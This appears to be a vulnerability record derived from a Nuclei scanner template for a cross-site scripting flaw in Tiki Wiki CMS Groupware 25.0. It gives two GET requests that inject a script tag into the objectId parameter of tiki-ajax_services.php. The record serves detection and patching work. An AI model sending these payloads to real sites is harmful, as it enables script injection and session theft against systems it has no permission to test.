# Vulnerability: Tiki Wiki CMS Groupware v25.0 - Cross Site Scripting
**Classification:** EDB
**Source:** Nuclei Template (`tikiwiki-xss.yaml`)

## Description
Tiki Wiki CMS Groupware version 25.0 suffers from a cross site scripting vulnerability.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/tiki/tiki-ajax_services.php?controller=comment&action=list&type=wiki+page&objectId=<script>alert(document.domain)</script>
GET {{BaseURL}}/tiki-ajax_services.php?controller=comment&action=list&type=wiki+page&objectId=<script>alert(document.domain)</script>
```

